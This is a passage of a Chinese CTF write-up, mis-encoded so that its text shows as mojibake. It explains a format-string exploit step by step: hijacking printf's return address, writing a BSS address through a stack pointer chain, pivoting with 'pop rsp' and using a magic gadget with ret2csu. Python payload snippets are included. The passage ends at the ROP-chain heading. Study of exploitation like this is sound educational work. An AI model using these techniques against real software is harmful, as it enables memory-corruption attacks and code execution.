ˆä¸­å¿…é¡»å­˜æ”¾ç€ä¸€ä¸ªæ ˆåœ°å€ï¼Œå¹¶ä¸”è¿™ä¸ªæ ˆåœ°å€æŒ‡å‘äº†å½“å‰å‡½æ•°çš„è¿”å›åœ°å€</strong>ï¼‰</p><h4 id="åŠæˆå“payload"><a href="#åŠæˆå“payload" class="headerlink" title="åŠæˆå“payload"></a>åŠæˆå“payload</h4><p>æ‰€ä»¥è¿™é‡Œçš„åŠæˆå“payloadæ˜¯è¿™æ ·çš„ï¼ˆ0xa3æ˜¯readçš„åœ°å€çš„æœ«å­—èŠ‚ï¼Œåç§»23å°±ä¸å†æ•°äº†ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¹‹æ‰€ä»¥æ˜¯åŠæˆå“ï¼Œæ˜¯å› ä¸ºæ‰§è¡Œäº†è¿™ä¸ªä¹‹åæˆ‘ä»¬ä»…ä»…åªæ˜¯è¿”å›åˆ°äº†printfï¼Œä½†äº‹å®ä¸Šæˆ‘ä»¬éœ€è¦å†å¹²ç‚¹åˆ«çš„äº‹æƒ…ï¼ˆå› ä¸ºå•çº¯çš„æ— é™æ‰§è¡Œprintfæ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼‰</p><h2 id="é¢˜ç›®æ•´ä½“å¤§è‡´æ€è·¯ï¼š"><a href="#é¢˜ç›®æ•´ä½“å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="é¢˜ç›®æ•´ä½“å¤§è‡´æ€è·¯ï¼š"></a>é¢˜ç›®æ•´ä½“å¤§è‡´æ€è·¯ï¼š</h2><p>æ­¤æ—¶å†æ‹ä¸€ä¸‹è·å–shellçš„æ€è·¯ã€‚</p><p>1ã€ä½ æƒ³å°è¯•æ³„éœ²å‡½æ•°åœ°å€ï¼Œå»libcé‡Œæœsystemï¼Ÿ   close(1)ç›´æ¥æ‰“æ¶ˆäº†è¿™æ¡è·¯ ï¼ˆå› ä¸ºæ‰§è¡Œæ‰“å°å‡½æ•°æ˜¯æ— æ³•æ³„éœ²å‡ºæ¥å†…å®¹çš„ï¼‰</p><p>2ã€åœ¨ä¸çŸ¥é“libcåŸºå€çš„æƒ…å†µä¸‹ï¼Œç›®å‰æˆ‘èƒ½æƒ³åˆ°çš„æ–¹æ³•åªæœ‰å»åˆ©ç”¨magic_gadgetæ¥ä¿®æ”¹ä¸€ä¸ªgotè¡¨äº†ã€‚</p><p>3ã€æƒ³åˆ©ç”¨magic_gadgetå°±è‚¯å®šæ˜¯éœ€è¦ä¸“é—¨æ§åˆ¶å¯„å­˜å™¨ï¼Œé‡‡ç”¨çš„æ‰‹æ³•è‚¯å®šè¦æ˜¯ret2csuã€‚ä½†æ˜¯æƒ³åˆ©ç”¨ret2csuä¸­çš„popå»æ§åˆ¶å„ä¸ªå¯„å­˜å™¨ï¼Œå°±æ„å‘³ç€æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶æ ˆä¸­çš„æ•°æ®ï¼Œå¯äº‹å®ä¸Šæˆ‘ä»¬è¾“å…¥çš„å†…å®¹å…¨éƒ½è·‘åˆ°bssæ®µäº†ã€‚ï¼ˆå¦‚æœåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦å‡½æ•°æŠŠæ•°æ®å…¨éƒ¨å¸ƒç½®åˆ°æ ˆä¸Šæ˜¯ä¸ç°å®çš„ï¼‰å› æ­¤é‡‡ç”¨çš„å¯¹æŠ—ç­–ç•¥æ˜¯è¿ç§»æ ˆåˆ°bssæ®µã€‚</p><p>4ã€è¿™é“é¢˜è¿ç§»æ ˆå’Œä»¥å¾€çš„æ ˆè¿ç§»ä¸ä¸€æ ·ï¼Œä»¥å¾€çš„æ ˆè¿ç§»æ˜¯å¯æ§çš„æ ˆåœ°å€å¾ˆå°‘ï¼Œå› æ­¤è£…ä¸ªleaveï¼›retï¼Œä½†äº‹å®ä¸Šè¿™é“é¢˜æˆ‘ä»¬å‹æ ¹å°±æ— æ³•è¾“å…¥å†…å®¹åˆ°æ ˆä¸Šã€‚è€ƒè™‘ä¸‹æ ˆè¿ç§»çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ æ§åˆ¶rspå¯„å­˜å™¨ã€‚æœä¸€ä¸‹gadgetçœ‹çœ‹ï¼Ÿ</p><p><img src="/../img/2706180-20220419221012046-905721054.png" alt="image-20220419121807276"></p><p>å‘ç°æ˜¯å­˜åœ¨pop rspçš„ã€‚</p><p>5ã€è‡³æ­¤æ€è·¯å·²ç»å¾ˆæ¸…æ™°äº†ï¼Œç”¨pop rspæ¥æ”¹å˜æ ˆåˆ°bssæ®µï¼Œç„¶åå¸ƒç½®ropé“¾åˆ°bssæ®µã€‚ä¸è¿‡åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦å°†pop rspå¸ƒç½®åˆ°bssåœ°å€çš„ä¸Šé¢ç´§æŒ¨ç€çš„å†…å­˜å•å…ƒ(å› ä¸ºpopå¼¹çš„å°±æ˜¯ä¸‹ä¸€ä¸ªå†…å­˜å•å…ƒçš„å€¼ç»™rsp)ã€‚</p><p>è€Œpop rspæœ€ç»ˆæ€ä¹ˆè¢«æ‰§è¡Œï¼Ÿåªèƒ½æ˜¯å°†printçš„è¿”å›åœ°å€æ”¹æˆpop rspçš„åœ°å€</p><blockquote><p><strong>æœ€ç»ˆå¾—å‡ºç»“è®ºï¼š</strong> æˆ‘ä»¬è¦ä¸€è¾¹åŠ«æŒprintfè¿›è¡Œå¤šæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ï¼Œä¸€è¾¹è¦å»å°†printè¿”å›åœ°å€ä¸‹é¢çš„å†…å­˜å•å…ƒæ”¹æˆbssåœ°å€ï¼Œæ”¹å†™å®Œæˆåï¼Œæœ€åä¸€æ¬¡payloadå»å°†printçš„è¿”å›åœ°å€æ”¹å†™æˆpop rspåœ°å€ï¼Œå¹¶ä¸”å°†ropé“¾å‘é€åˆ°bssæ®µä¸Šã€‚</p></blockquote><p>æ¥ä¸‹æ¥çš„å†…å®¹åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯å¦‚ä½•ä¸€ç‚¹ä¸€ç‚¹åœ¨æ ˆä¸Šå†™å…¥bssæ®µåœ°å€ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸ºropé“¾çš„æ„é€ ã€‚</p><h2 id="æ ˆé“¾çš„å¸ƒç½®"><a href="#æ ˆé“¾çš„å¸ƒç½®" class="headerlink" title="æ ˆé“¾çš„å¸ƒç½®"></a>æ ˆé“¾çš„å¸ƒç½®</h2><p>é¦–å…ˆæ˜ç¡®ä¸¤ä»¶äº‹æƒ…ï¼Œæˆ‘ä»¬ä¿®æ”¹åœ°å€æ— æ³•ç”¨$nä¸€æ¬¡æ€§å°†æ•´ä¸ªå†…å®¹å…¨éƒ¨å†™å…¥(å› ä¸ºå­—ç¬¦æ•°é‡å¤ªå¤šå°†å¯¼è‡´ä¼ è¾“å¼‚å¸¸ï¼‰å› æ­¤æˆ‘ä»¬æœ€å¤šåªèƒ½ä¸€æ¬¡å†™ä¸¤å­—èŠ‚($hn)æˆ–æ˜¯ä¸€æ¬¡å†™ä¸€å­—èŠ‚($hhn)ã€‚</p><p>ç¬¬äºŒä»¶äº‹ï¼Œå°±æ˜¯ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„å†™çš„æ—¶å€™ï¼Œæ˜¯åˆ©ç”¨ç›¸å¯¹æ ˆé¡¶åç§»å†™å…¥æ•°æ®ï¼Œéš¾é“æ˜¯å°†æ•°æ®å†™åˆ°ç›¸å¯¹æ ˆé¡¶åç§»çš„è¿™ä¸ªåœ°æ–¹ï¼Ÿä¸ä¸ä¸ï¼Œ<strong>å…¶å®æ˜¯å°†æ•°æ®å†™åˆ°äº†ç›¸å¯¹äºæ ˆé¡¶åç§»è¿™ä¸ªåœ°æ–¹æ‰€æŒ‡å‘çš„åœ°æ–¹ã€‚</strong></p><p>ä»¥<code>%100c%9$hn</code>ä¸ºä¾‹ã€‚å®ƒçš„æ„æ€æ˜¯<strong>è¯´å°†100å†™å…¥è·ç¦»æ ˆé¡¶åç§»ä¸º9æ‰€æŒ‡å‘çš„ä½ç½®</strong>ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚</p><p><img src="/../img/2706180-20220419222956380-1871716338.png"><br><img src="/../img/2706180-20220419223019980-1819334104.png"></p><p>è¿™ä¸¤å¼ å›¾ç‰‡åº”è¯¥èƒ½è¯´æ˜çš„å¾ˆå……åˆ†äº†å§ï¼Œ<strong>å°±æ˜¯æ ˆä¸­æ•°æ®å¿…é¡»æ˜¯ä¸ªåœ°å€ï¼Œæ‰èƒ½é€šè¿‡å®ƒä¿®æ”¹å®ƒæŒ‡å‘çš„é‚£ä¸ªä½ç½®</strong>ã€‚ï¼ˆ0x112233å˜æˆ0x112264æ˜¯å› ä¸º100çš„åå…­è¿›åˆ¶æ˜¯64ï¼‰</p><blockquote><p>æ­¤æ—¶æˆ‘ä»¬æƒ³åœ¨ä¸€ä¸ªå¤§å°ä¸ºå…«å­—èŠ‚çš„å†…å­˜å•å…ƒä¸­ç”¨ä¸€æ¬¡å†™å…¥ä¸¤å­—èŠ‚çš„æ–¹æ³•å‡­ç©ºå†™ä¸€ä¸ªbssæ®µåœ°å€ï¼Œéœ€è¦æ€ä¹ˆåšï¼Ÿ</p><p>ç°åœ¨å°†è¿›å…¥çƒ§è„‘æ—¶åˆ»ï¼Œæˆ‘ä»¬æš‚æ—¶å…ˆæŠ›å¼€è¿™é“é¢˜ï¼Œå»æƒ³ä¸€ä¸‹è¿™ä¸ªé—®é¢˜</p></blockquote><p>æˆ‘ä»¬ä¼¼ä¹è¦å»æ‰¾ä¸€ä¸ªæ ˆåœ°å€aï¼Œè¿™ä¸ªæ ˆåœ°å€aæŒ‡å‘çš„å†…å®¹ä¹Ÿè¦æ˜¯ä¸ªæ ˆåœ°å€bï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å»å¾€æ ˆåœ°å€bæ‰€æŒ‡å‘çš„é‚£ä¸ªå†…å­˜å•å…ƒé‡Œå†™å…¥ä¸€ä¸ªbssæ®µåœ°å€äº†ï¼Œå°±è·Ÿä¸Šé¢é‚£ä¸¤å¼ å›¾ç‰‡ä¸€æ ·ï¼Ÿ</p><p>ä½†æ˜¯ä¼¼ä¹å‡ºç°äº†ç‚¹é—®é¢˜ï¼Œå› ä¸ºæˆ‘ä»¬åªèƒ½ä¸€æ¬¡å†™å…¥ä¸¤å­—èŠ‚ï¼Œè€Œè¦å†™å…¥bssæ®µåœ°å€çš„åŒæ—¶è¿˜è¦å°†è¿™ä¸ªå†…å­˜å•å…ƒä¸­æ²¡æœ‰ç”¨çš„éƒ¨åˆ†å°†å…¶è®¾ç½®ä¸º0ã€‚å¦‚æœå†æŒ‰ç…§ä¸Šé¢ä¸¤ä¸ªå›¾ç‰‡çš„æ–¹æ³•å»å†™å…¥ï¼Œæˆ‘ä»¬æ°¸è¿œåªèƒ½å»ä¿®æ”¹é‚£ä¸€ä¸ªå­—èŠ‚çš„éƒ¨åˆ†ã€‚</p><p>å› æ­¤äº§ç”Ÿçš„ç­–ç•¥æ˜¯ï¼Œæˆ‘ä»¬ç”¨ä¸‰ä¸ªæŒ‡é’ˆæ¥å®Œæˆå†™å…¥bssåœ°å€è¿™ä»¶äº‹ã€‚ç›´æ¥ä¸Šå›¾ç‰‡</p><p><img src="/../img/2706180-20220419223038254-1190819708.png"></p><p>ç°åœ¨å‡è®¾a,b,cå…¨éƒ¨éƒ½ä¸ºæ ˆåœ°å€ï¼Œè€Œdçš„å€¼ä¸º0xffffffffffffffffï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯å°†dä¿®æ”¹ä¸º0x601060ã€‚</p><blockquote><p> æˆ‘ä»¬å…ˆçœ‹æœ€åä¸€è¡Œçš„ä¸‰ä¸ªæŒ‡é’ˆï¼Œå¦‚æœç°åœ¨æœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„è¯ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥æ‹¿åˆ°bè·ç¦»æ ˆé¡¶åç§»ï¼Œç„¶åé€šè¿‡bå»ä¿®æ”¹cçš„å€¼ã€‚ç„¶åè¿˜å¯ä»¥çœ‹ç¬¬äºŒè¡Œï¼Œæ‹¿åˆ°cç›¸å¯¹æ ˆé¡¶åç§»ï¼Œé€šè¿‡cå»ä¿®æ”¹dçš„å€¼ã€‚è€Œæˆ‘ä»¬æ¯æ¬¡åªèƒ½å†™å…¥ä¸¤ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€æ¬¡åªèƒ½é€šè¿‡cæ¥å°†dä¿®æ”¹ä¸º0xffffffffffff1060ã€‚ç„¶åæˆ‘ä»¬å†å»ç¬¬ä¸‰è¡Œï¼Œé€šè¿‡bæ¥ä¿®æ”¹cçš„å€¼ï¼ŒæŠŠcæ”¹æˆc+2ï¼Œæ¥ç€å†å›åˆ°ç¬¬äºŒè¡Œï¼Œé€šè¿‡cæ¥ä¿®æ”¹dçš„å€¼ï¼Œè¿™æ¬¡æˆ‘ä»¬å°†då¯ä»¥æ”¹æˆ0xffffffff00601060ã€‚ä¾æ¬¡ç±»æ¨ï¼ˆæŠŠå‰é¢çš„ffå…¨éƒ¨æ”¹æˆ0ï¼‰ï¼Œæˆ‘ä»¬é ç§»åŠ¨cæŒ‡é’ˆçš„ä½ç½®ï¼Œæ¥æ”¹å˜æˆ‘ä»¬å†™å…¥dçš„ä½ç½®ï¼Œå°½ç®¡ä¸€æ¬¡æ˜¯å†™å…¥ä¸¤ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æœ€ç»ˆä¾æ—§å¯ä»¥è¾¾åˆ°åœ¨ä¸€ä¸ªå†…å­˜å•å…ƒä¸­å†™å‡ºä¸€ä¸ªå®Œæ•´çš„åœ°å€ã€‚</p></blockquote><p>å¦‚æœæ²¡ç†è§£çš„è¯ï¼Œå…ˆç¡®ä¿è‡ªå·±æ˜¯å¦çœŸçš„æ˜ç™½å¦‚ä½•åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´å®Œæˆå†™çš„æ“ä½œï¼Œå¦‚æœæ˜¯çœŸçš„æ˜ç™½è¿™ä»¶äº‹ï¼Œå°±åå¤å»æƒ³ä¸€ä¸‹ä¸Šé¢çš„è¿‡ç¨‹ã€‚</p><p>ok,æˆ‘ç°åœ¨å‡è®¾ä½ å·²ç»æ‡‚äº†ä¸Šé¢çš„è¿‡ç¨‹ï¼Œé‚£æ¥ä¸‹æ¥çš„è¿‡ç¨‹å¯¹ä½ æ¥è¯´å°±æ˜¯å°å„¿ç§‘äº†ã€‚</p><p>æ€è·¯é‡æ–°å›åˆ°è¿™ä¸ªé¢˜ç›®æ¥ï¼Œçœ‹ä¸€ä¸‹æ‰§è¡Œå®Œç¬¬ä¸€ä¸ªpayloadä¹‹åï¼Œæ ˆé‡Œçš„æƒ…å†µï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220419221011687-970875891.png" alt="image-20220419144015357"></p><p>ç°åœ¨æˆ‘ä»¬è¦åšçš„å°±æ˜¯åœ¨æ ˆé‡Œå†™ä¸€ä¸ªbssæ®µåœ°å€ï¼ˆæœ¬é¢˜å†™çš„bssæ®µåœ°å€æ˜¯0x601088ï¼Œè¿™ä¸ªåœ°å€åˆšå¼€å§‹æ˜¯ä¸çŸ¥é“çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆéšä¾¿å†™ä¸ªåœ°å€ï¼Œæœ€åé€šè¿‡è°ƒè¯•å»æŠŠè¿™ä¸ªæ­£ç¡®çš„åœ°å€è¿›è¡Œé‡æ–°ä¿®æ­£ï¼‰</p><p>ä¸Šå›¾ä¸­æ ‡æ³¨çš„â‘ ï¼Œâ‘¡ï¼Œâ‘¢å…¶å®å°±å¯¹åº”æˆ‘æ¼”ç¤ºçš„é‚£ä¸ªå›¾ç‰‡ã€‚è¿˜è®°å¾—ä¸Šæ–‡æåˆ°çš„ä¸€ä¸ªåŠæˆå“payloadä¹ˆï¼Œå…¶å®å°±æ˜¯â‘£ï¼Œprintfå°†ä¿®æ”¹å®ƒè‡ªå·±çš„è¿”å›åœ°å€ã€‚</p><p>ä¸‹é¢æ¥å±•ç¤ºä¸‹payloadï¼Œä»¥åŠä¿®æ”¹å‰åçš„æ ˆï¼ˆå˜åŒ–å‰åçš„åœ°æ–¹å·²ç”¨çº¢æ¡†æ ‡æ³¨ï¼‰ï¼ˆä¿®æ”¹åŸç†ä¸Šé¢å·²ç»ä»‹ç»è¿‡äº†ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr=((leak_stack_addr-<span class="number">0x118</span>)&amp;<span class="number">0xff</span>)<span class="comment">#æ³„éœ²çš„æ ˆåœ°å€è·ç¦»è¿”å›åœ°å€ä¸‹é¢çš„é‚£ä¸ªå†…å­˜å•å…ƒçš„åœ°å€åç§»ä¸º0x118</span></span><br><span class="line"><span class="keyword">if</span> hook_addr&gt;<span class="number">0xa3</span>:</span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    judge=<span class="number">2</span></span><br><span class="line"><span class="comment">#ifè¿›è¡Œåˆ¤æ–­æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“hook_addrå’Œ0xa3è°æ‰“ï¼Œå› æ­¤éœ€è¦åº”å¯¹è¿™ä¸¤ç§æƒ…å†µ</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å‰ï¼š</p><p><img src="/../img/2706180-20220419221009667-1000319065.png" alt="image-20220419175618585"></p><p>ä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220419221008260-139544778.png" alt="image-20220419191555739"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x1088</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span><span class="comment">#å»å†™å…¥ä½äºŒå­—èŠ‚0x1088</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å‰ï¼š</p><p><img src="/../img/2706180-20220419221006281-955412098.png" alt="image-20220419175849476"></p><p>ä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220419221004925-759941982.png" alt="image-20220419191955052"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¼€å§‹ç§»åŠ¨ æŒ‡å‘bssæ®µæŒ‡é’ˆï¼Œæ–¹ä¾¿ç¬¬äºŒæ¬¡çš„å†™å…¥bssæ®µ</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span><span class="comment">#å°†æŒ‡å‘bssæ®µçš„æŒ‡é’ˆæŠ¬é«˜ä¸¤å­—èŠ‚</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å‰ï¼š</p><p><img src="/../img/2706180-20220419221003228-2090621249.png" alt="image-20220419180744259"></p><p>ä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220419221001000-1387788773.png" alt="image-20220419180954716"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å‰ï¼š</p><p><img src="/../img/2706180-20220419220959694-85625257.png" alt="image-20220419182535080"></p><p>ä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220419220958563-1794782074.png" alt="image-20220419183311175"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr=hook_addr+<span class="number">0x2</span><span class="comment">#ç»§ç»­å°†æŒ‡å‘bssæ®µçš„æŒ‡é’ˆæŠ¬é«˜ä¸¤å­—èŠ‚</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å‰ï¼š</p><p><img src="/../img/2706180-20220419220957599-2028534812.png" alt="image-20220419184908968"></p><p>ä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220419220956611-987086324.png" alt="image-20220419185253367"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%13$hn&#x27;</span>  <span class="comment">#è¿™ä¸ªçš„æ„æ€æ˜¯å†™å…¥ä¸¤å­—èŠ‚çš„0ç»™æ ˆé¡¶åç§»13æŒ‡å‘çš„ä½ç½®</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span> <span class="comment">#è¿™ä¸ªç­‰ä¸‹å†è¯´</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å‰ï¼š</p><p><img src="/../img/2706180-20220419220955982-2010102532.png" alt="image-20220419204052994"></p><p>ä¿®æ”¹åï¼š</p><p><img src="/../img/2706180-20220419220955263-29560299.png" alt="image-20220419204804195"></p><p>è‡³æ­¤æˆ‘ä»¬å·²ç»è¾¾åˆ°æƒ³è¦çš„æ•ˆæœäº†ï¼Œä¹Ÿå°±æ˜¯å°†printfè¿”å›åœ°å€ä¸‹é¢çš„é‚£ä¸ªå†…å­˜å•å…ƒå†™æˆbssæ®µåœ°å€ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±ä¸ç”¨printfå†è¿”å›å»æ‰§è¡Œreadäº†ï¼Œæˆ‘ä»¬å»æ‰§è¡Œpop rsp</p><p><img src="/../img/2706180-20220419220952979-1955251566.png" alt="image-20220419205614827"></p><p>åªéœ€å»æ”¹å˜è¿”å›åœ°å€çš„æœ€åä¸¤å­—èŠ‚å³å¯ã€‚(payloadå¦‚ä¸‹)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œå‰é¢çš„å·¥ä½œå…¨éƒ¨å®Œæˆï¼Œå·²ç»å¯ä»¥å»è¿ç§»åˆ°æˆ‘ä»¬æŒ‡å®šçš„bssæ®µäº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯ropé“¾çš„æ„é€ ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰è¿˜æ˜¯éœ€è¦ä»‹ç»ä¸€ä¸‹magic gadget</p><h3 id="ä»‹ç»ä¸€ä¸‹magic-gadget"><a href="#ä»‹ç»ä¸€ä¸‹magic-gadget" class="headerlink" title="ä»‹ç»ä¸€ä¸‹magic_gadget"></a>ä»‹ç»ä¸€ä¸‹magic_gadget</h3><h4 id="ä¸€ä¸ªæ–°çš„magic-gadget"><a href="#ä¸€ä¸ªæ–°çš„magic-gadget" class="headerlink" title="ä¸€ä¸ªæ–°çš„magic_gadget"></a>ä¸€ä¸ªæ–°çš„magic_gadget</h4><p>å…³äºmagic_gadgetè¯¦ç»†è§£é‡Šï¼Œæˆ‘å†™åœ¨äº†è¿™ç¯‡åšå®¢ä¸Š  <a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">here</a></p><p><img src="/../img/2706180-20220419220954443-867091423.png" alt="image-20220419132940571"></p><p>æˆ‘ä»¥å‰ç”¨çš„magic gadgetæ˜¯è¿™ä¸ª add    DWORD PTR [rbp-0x3d], ebx  ä½†è¿™é“é¢˜æœå¯¹åº”çš„æœºå™¨ç æœä¸åˆ°äº†â€¦  ä¸è¿‡å®˜æ–¹æ”¾å‡ºäº†å¦ä¸€ä¸ªgadget </p><p>adc    DWORD PTR [rbp+0x48],edx</p><p>è¿™ä¸ªçš„æ•ˆæœæ˜¯å’Œä¹‹å‰é‚£ä¸ªmagic gadgetæ•ˆæœä¸€æ ·ã€‚æˆ‘ä»¬åªéœ€è¦åˆ©ç”¨csuç‰‡æ®µæ§åˆ¶ä¸€ä¸‹å¯„å­˜å™¨rbpå’Œedxçš„å€¼ï¼Œå°±å¯ä»¥è¾¾åˆ°ä¿®æ”¹çš„ç›®çš„ã€‚<strong>å…·ä½“æ–¹æ³•ä¸º rbpä¸­è£…å…¥stderræŒ‡é’ˆï¼ˆå› ä¸ºå®ƒæœ¬èº«å°±å­˜åœ¨äºlibcåº“ä¸­ï¼‰ï¼Œedxä¸­æ”¾å…¥libcä¸­stderrä¸one_gadgetçš„åç§»ã€‚</strong></p><p>ä¸ºä»€ä¹ˆè¦æ”¾stderrï¼Ÿå› ä¸ºæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡ºæˆ‘ä»¬è‚¯å®šæ˜¯ä¸èƒ½æ”¹ï¼Œç„¶åæˆ‘æœ¬æ¥æ˜¯æƒ³æ”¾ä¸ªæ²¡ç”¨å‡½æ•°çš„gotåœ°å€ï¼Œç„¶åç»™ä¿®æ”¹äº†ã€‚ä½†æ˜¯æˆ‘ç”¨pwndbgè¾“å…¥gotä¹‹åæ²¡æœ‰æŠŠgotè¡¨ç»™å±•ç¤ºå‡ºæ¥â€¦</p><p><img src="/../img/2706180-20220419220954240-1943973195.png" alt="image-20220419140734080"></p><p>é‚£å°±ç”¨è¿™ä¸ªstderræ¥å½“åšä¸ªè·³æ¿å§</p><h4 id="å¦‚ä½•å¯»æ‰¾è¿™ä¸ªæ–°çš„magic-gadget"><a href="#å¦‚ä½•å¯»æ‰¾è¿™ä¸ªæ–°çš„magic-gadget" class="headerlink" title="å¦‚ä½•å¯»æ‰¾è¿™ä¸ªæ–°çš„magic gadget"></a>å¦‚ä½•å¯»æ‰¾è¿™ä¸ªæ–°çš„magic gadget</h4><p>ROPgadget â€“binary a â€“opcode 11554889       ï¼ˆç›´æ¥æœè¿™ä¸ªgadgetçš„æœºå™¨ç ï¼‰</p><p><img src="/../img/2706180-20220419220954014-45506295.png" alt="image-20220416151801735"></p><p><img src="/../img/2706180-20220419220953665-1979006857.png" alt="image-20220416151836813"></p><h2 id="ropé“¾çš„æ„é€ "><a 